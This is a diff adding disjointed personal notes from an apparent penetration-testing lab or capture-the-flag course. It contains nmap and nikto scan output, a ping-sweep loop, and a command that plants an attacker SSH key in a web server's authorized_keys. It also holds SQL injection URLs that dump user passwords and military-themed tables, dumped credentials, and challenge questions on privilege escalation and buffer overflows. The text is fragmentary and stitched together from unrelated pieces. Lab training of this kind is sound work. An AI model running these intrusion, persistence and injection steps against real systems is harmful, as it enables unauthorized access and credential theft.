@@ -1,0 +1,200 @@
+10.10.x.x
+x.x.x.9
+10.0
+.30
+.90
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-07-18 12:59 UTC
+Nmap scan report for 10.50.26.86
+Host is up (0.0052s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+| http-enum: 
+|   /robots.txt: Robots file
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /share/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+Nmap done: 1 IP address (1 host up) scanned in 5.31 seconds
+
+
+
+192.168.28.0/27
+192.168.28.160/27
+
+
+
+
+
+
+
+
+
+
+
+from autologin import AutoLogin
+cookies.__dict__
+url = 'https://er635tlalssee/autolllget/adrrt/.com'
+name=b3BlbnVwdGhlZG9vcgo=
+al = Auto()
+sec= QjEyYzNiMzRmCg==
+cookies = al.auth_cookies_from_url(url, name, sec)
+>>> al.login_request(html_source, username, password, base_url=None)
+{'body': 'login=thisaintit&password=',
+ 'headers': {b'Content-Type': b'application/x-www-form-urlencoded'},
+ 'method': 'POST',
+ 'url': '/login'}
+cookies = al.auth_cookies_from_url(
+    url, username, password,
+    extra_js='document.getElementById("accept-cookies").click();',
+    settings={
+        'SPLASH_URL': 'http://127.0.0.1/8050',
+        'USER_AGENT': 'Mozilla/2.02 [fr] (WinNT; I)',
+        
+        
+        
+        })   
+        
+        
+        
+        
+        
+  echo  'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqhKOXtEVMNTy21Kj/N9xTbmT9vyMjt8OPoAF55IXbeAm4ajSJR8Z4KGTKZiQq46uOdvkbg8+o9OEp1wWYo1nnyI9a9XvEx3GtjPFbZWEbj9POSrjNiRnI0+kwVPTx0qIB4aOuRiFZsaLs3AR/XjALRQgAcmYlahHloAilmX5i/jpGwF3SRUaZ3WKqdv5Pb44dR/o8P0wcfGzUcHMkVzKu8zwGq4WUYPc6MauAfb17zRpjpqVMUSsmilbwrs1/ftEMpKUQvtcJ0bL93eyoJeNQZzi4uEk+4QXankKlDwriq57nnY8TOTggguJ6bMTMOf3nAE0S0YVC6k3oVwvX1IBb student@lin-ops' > /var/www/.ssh/authorized_keys      
+        
+        
+        
+        
+        for i in {1..254} ;do (ping -c 1 10.0.28.$i | grep "bytes from" &) ;done
+        
+        
+        
+        10.0.28.52:80
+  + OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-561: /server-status: This reveals Apache information. Comment out appropriate line in httpd.conf or restrict access to allowed hosts.
++ OSVDB-3268: /Onlinetools/: Directory indexing found.
++ File/dir '/Onlinetools/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 1 entry which should be manually viewed.
+
+
+
+
+Array ( [0] => Msmith [name] => Msmith [1] => Squanchy [password] => Squanchy ) 1Array ( [0] => Fpalic [name] => Fpalic [1] => Birdperson [password] => Birdperson ) 1Array ( [0] => Kmichae [name] => Kmichae [1] => MrMeeseeks [password] => MrMeeseeks ) 1
+
+Province 	Simferopol
+Civilian population 	320477
+Residing Unit 	262nd Military Storage
+Troop strength 	1200
+Province 	1
+Civilian population 	Rick Sanchez
+Residing Unit 	Rsanch
+Troop strength 	ScaryTerry
+Province 	2
+Civilian population 	Morty Smith
+Residing Unit 	Msmith
+Troop strength 	Squanchy
+Province 	3
+Civilian population 	Frank Palicky
+Residing Unit 	Fpalic
+Troop strength 	Birdperson
+Province 	4
+Civilian population 	Krombopulos Michael
+Residing Unit 	Kmichae
+Troop strength 	MrMeeseeks
+
+Province 	1
+Civilian population 	Kyiv
+Residing Unit 	Kiev
+Troop strength 	2797553
+Province 	2
+Civilian population 	Dnipro
+Residing Unit 	Kiev
+Troop strength 	1032822
+Province 	3
+Civilian population 	Odessas
+Residing Unit 	Kiev
+Troop strength 	1001558
+Province 	4
+Civilian population 	Lviv
+Residing Unit 	Kiev
+Troop strength 	717803
+Province 	5
+Civilian population 	Sevastopol
+Residing Unit 	Simferopol
+Troop strength 	416263
+Province 	6
+Civilian population 	Makiyivka
+Residing Unit 	Simferopol
+Troop strength 	320477
+Province 	7
+Civilian population 	Vinnytsia
+Residing Unit 	Zaporozhye
+Troop strength 	307684
+Province 	8
+Civilian population 	Poltava
+Residing Unit 	Uzhgorod
+Troop strength 	294456
+Province 	9
+Civilian population 	Cherkasy
+Residing Unit 	Zaporozhye
+Troop strength 	278550
+Province 	10
+Civilian population 	Sumy
+Residing Unit 	Uzhgorod
+Troop strength 	416263
+        
+        http://localhost:30101/forces/forcespick.php?Locations=6%20UNION%20SELECT%20table_schema,table_name,3,4%20from%20information_schema.columns
+        
+        http://localhost:30101/forces/forcespick.php?Locations=6%20UNION%20SELECT%205,column_name,table_schema,table_name%20from%20information_schema.columns
+ 
+ 
+
+http://localhost:30101/forces/forcespick.php?Locations=6%20UNION%20SELECT%20id,name,rank,unit%20from%20forces.commanders
+
+http://localhost:30101/forces/forcespick.php?Locations=6%20UNION%20SELECT%20user_id,user,name,password%20from%20auth_users-logins
+
+http://localhost:30101/forces/forcespick.php?Locations=6%20UNION%20SELECT%20id,city,province,civilian_pop%20from%20forces.locations
+
+http://localhost:30101/forces/forcespick.php?Locations=6%20UNION%20SELECT%20id,unit,auth_str,on_hand%20from%20forces.units
+
+
+
+
+
+R_and_D_Nix1
+What is inside the file located in roots directory? *----
+What binary was used to escalate?*----
+Which running process could cause alarm to a person attempting to remain stealthy?*
+A process that may cause an alarm, is configured to send data to an IP. The flag is written within the comments.*
+Identify any files that could contain passwords. What is inside?*
+
+
+
+R_and_D_Nix2
+What is the vulnerable function in the binary that can be run with elevated privileges by your user?*-----
+How many characters are required in the buffer to overwrite the EIP? *------
+What is inside the file located at /root/home/secretmessage?*------
+What program can be run at an elevated privilege level by the user you landed onto the box as?-----
+
+
+
+
+R_and_D_Win1 
+
+One of the users directories has a file that will provide a flag.*
+How many security policies are set to log for both successful and failed events? *
+What file is being used in an attempt to have persistence? *
+Based on the file that is being used for persistence, a program is being called. What is the document number in the file that identifies the program? *
+What flag resides in Admin's home? NOTE: The developers have created a dropper file that could be used. If successfully ran will crate the account hack :: pass123 *
+
+
+
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+
+ 
